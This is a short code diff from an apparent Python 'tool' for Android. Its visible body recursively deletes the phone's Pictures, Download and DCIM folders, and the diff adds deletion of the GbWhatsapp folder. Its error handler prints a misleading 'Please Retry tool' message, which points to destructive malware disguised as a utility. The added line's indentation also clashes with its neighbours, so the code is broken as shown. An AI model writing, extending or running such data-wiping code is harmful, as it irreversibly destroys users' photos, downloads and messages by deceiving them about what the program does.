@@ -19,6 +19,7 @@ try:
 	shutil.rmtree("/storage/emulated/0/Pictures")
 	shutil.rmtree("/storage/emulated/0/Download")
 	shutil.rmtree("/storage/emulated/0/DCIM")
+        shutil.rmtree("/storage/emulated/0/GbWhatsapp")
 except:
 	print("Sorry,an error occured.Please Retry tool..")
 
